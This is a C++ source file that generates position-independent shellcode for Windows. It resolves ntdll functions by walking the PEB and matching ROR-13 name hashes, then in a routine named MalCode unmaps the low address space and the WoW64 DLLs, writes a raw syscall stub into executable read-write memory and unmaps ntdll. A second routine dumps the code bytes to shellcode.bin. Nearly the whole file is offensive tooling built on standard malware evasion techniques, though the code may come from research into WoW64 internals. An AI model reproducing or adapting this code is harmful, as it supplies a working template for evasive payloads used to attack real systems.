#include "ScStdio.h"

#include <intrin.h>

#define ROR_SHIFT 13

namespace ScStdio {

	/*
		VS Compilation Switches:
		C/C++ -> Optimization -> /O1, /Ob2, /Oi, /Os, /Oy-, /GL
		C/C++ -> Code Generation -> /MT, /GS-, /Gy
		Linker -> General -> /INCREMENTAL:NO
	*/

	NTSYSAPI NTSTATUS NtUnmapViewOfSection(
		DWORD64 ProcessHandle,
		DWORD64  BaseAddress
	);

	NTSYSAPI NTSTATUS NtProtectVirtualMemory(
		HANDLE  ProcessHandle,
		PVOID* BaseAddress,
		PULONG  NumberOfBytesToProtect,
		ULONG   NewAccessProtection,
		PULONG  OldAccessProtection
	);

	NTSYSAPI NTSTATUS NtAllocateVirtualMemory(
		DWORD64    ProcessHandle,
		DWORD64 BaseAddress,
		DWORD64 ZeroBits,
		DWORD64   RegionSize,
		DWORD64     AllocationType,
		DWORD64     Protect
	);

	typedef NTSTATUS(NTAPI* p_SysUnmapViewOfSection) (
		DWORD64 ProcessHandle,
		DWORD64  BaseAddress
		);

#ifndef _WIN64
	__declspec(naked) void MalCodeBegin() { __asm { jmp MalCode } };
#else
	void MalCodeBegin() { MalCode(); }
#endif

	PPEB getPEB() {
		PPEB p;
#ifndef _WIN64
		p = (PPEB)__readfsdword(0x30);
#else
		p = (PPEB)__readgsqword(0x60);
#endif
		return p;
	}

	constexpr DWORD ct_ror(DWORD n) {
		return (n >> ROR_SHIFT) | (n << (sizeof(DWORD) * CHAR_BIT - ROR_SHIFT));
	}

	constexpr char ct_upper(const char c) {
		return (c >= 'a') ? (c - ('a' - 'A')) : c;
	}

	constexpr DWORD ct_hash(const char* str, DWORD sum = 0) {
		return *str ? ct_hash(str + 1, ct_ror(sum) + ct_upper(*str)) : sum;
	}

	DWORD rt_hash(const char* str) {
		DWORD h = 0;
		while (*str) {
			h = (h >> ROR_SHIFT) | (h << (sizeof(DWORD) * CHAR_BIT - ROR_SHIFT));
			h += *str >= 'a' ? *str - ('a' - 'A') : *str;
			str++;
		}
		return h;
	}

	LDR_DATA_TABLE_ENTRY* getDataTableEntry(const LIST_ENTRY* ptr) {
		int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		return (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - list_entry_offset);
	}

	PVOID getProcAddrByHash(DWORD hash) {
		PEB* peb = getPEB();
		LIST_ENTRY* first = peb->Ldr->InMemoryOrderModuleList.Flink;
		LIST_ENTRY* ptr = first;
		do {
			LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);
			ptr = ptr->Flink;

			BYTE* baseAddress = (BYTE*)dte->DllBase;
			if (!baseAddress)
				continue;
			IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
			IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
			DWORD iedRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
			if (!iedRVA)
				continue;
			IMAGE_EXPORT_DIRECTORY* ied = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + iedRVA);
			char* moduleName = (char*)(baseAddress + ied->Name);
			DWORD moduleHash = rt_hash(moduleName);
			DWORD* nameRVAs = (DWORD*)(baseAddress + ied->AddressOfNames);
			for (DWORD i = 0; i < ied->NumberOfNames; ++i) {
				char* functionName = (char*)(baseAddress + nameRVAs[i]);
				if (hash == moduleHash + rt_hash(functionName)) {
					WORD ordinal = ((WORD*)(baseAddress + ied->AddressOfNameOrdinals))[i];
					DWORD functionRVA = ((DWORD*)(baseAddress + ied->AddressOfFunctions))[ordinal];
					return baseAddress + functionRVA;
				}
			}
		} while (ptr != first);

		return NULL;
	}

#define DEFINE_FUNC_PTR(module, function) \
	constexpr DWORD hash_##function = ct_hash(module) + ct_hash(#function); \
	typedef decltype(function) type_##function; \
	type_##function *##function = (type_##function *)getProcAddrByHash(hash_##function)

#define DEFINE_FWD_FUNC_PTR(module, real_func, function) \
	constexpr DWORD hash_##function = ct_hash(module) + ct_hash(real_func); \
	typedef decltype(function) type_##function; \
	type_##function *##function = (type_##function *)getProcAddrByHash(hash_##function)

	VOID __stdcall MalCode() {

		// We could use only syscalls, but for clarity let's not
		DEFINE_FUNC_PTR("ntdll.dll", NtAllocateVirtualMemory);
		DEFINE_FUNC_PTR("ntdll.dll", NtUnmapViewOfSection);
		DEFINE_FUNC_PTR("ntdll.dll", NtProtectVirtualMemory);

		// First obtain WoW64 addresses, needed for unmapping later
		DWORD64 addrWoW64 = 0;
		DWORD64 addrWoW64Win = 0;
		DWORD64 addrNtdll = 0;

		PPEB peb64 = getPEB();
		LIST_ENTRY* first = peb64->Ldr->InMemoryOrderModuleList.Flink;
		LIST_ENTRY* ptr = first;
		int cntr = 0;

		do {

			LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);
			ptr = ptr->Flink;

			if (cntr == 1) {
				addrNtdll = (DWORD64)dte->DllBase;
			}
			else if (cntr == 2) {
				addrWoW64 = (DWORD64)dte->DllBase;
			}
			else if (cntr == 3) {
				addrWoW64Win = (DWORD64)dte->DllBase;
			}

			cntr++;
		} while (ptr != first);

		// Unmap everything below 4GB boundary
		for (DWORD m = 0; m < 0x80000000; m += 0x1000)
		{
			PVOID ptrToProtect = (PVOID)m;
			ULONG dwBytesToProtect = 1;
			ULONG dwOldProt = 0;

			NtProtectVirtualMemory((HANDLE)-1, &ptrToProtect, &dwBytesToProtect, PAGE_READWRITE, &dwOldProt);
			NtUnmapViewOfSection((DWORD64)-1, (DWORD64)m);
		}

		// Unmap WoW64 Dlls
		NtUnmapViewOfSection(-1, addrWoW64);
		NtUnmapViewOfSection(-1, addrWoW64Win);

		// Allocate and write syscall stub
		DWORD64 syscallbase = 0x20000000000;
		SIZE_T size = 0x1000;
		DWORD64 ntstatus = NtAllocateVirtualMemory((DWORD64)-1, (DWORD64)&syscallbase, 0, (DWORD64)&size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		DWORD dwCode1 = 0xb8d18b4c;
		DWORD dwCode2 = 0x0000002a; // NtUnmapViewOfSection
		DWORD dwCode3 = 0x90c3050f;

		*(DWORD*)syscallbase = dwCode1;
		*((DWORD*)syscallbase + 1) = dwCode2;
		*((DWORD*)syscallbase + 2) = dwCode3;

		// Unmap Ntdll
		p_SysUnmapViewOfSection sysUnmap = (p_SysUnmapViewOfSection)syscallbase;
		sysUnmap((DWORD64)-1, addrNtdll);

		__debugbreak();
	}

#ifndef _WIN64
	__declspec(naked) void MalCodeEnd() { };
#else
	void MalCodeEnd() {};
#endif

	BOOL WriteShellcodeToDisk()
	{
		DWORD dwWritten;
		HANDLE FileHandle = CreateFileW(L"shellcode.bin", GENERIC_ALL, NULL, NULL, CREATE_ALWAYS, NULL, NULL);

		if (!FileHandle)
			return false;

		if (WriteFile(FileHandle, &MalCodeBegin, ((DWORD)&MalCodeEnd - (DWORD)&MalCodeBegin), &dwWritten, NULL))
		{
			CloseHandle(FileHandle);
			return true;
		}

		CloseHandle(FileHandle);
		return false;
	}
}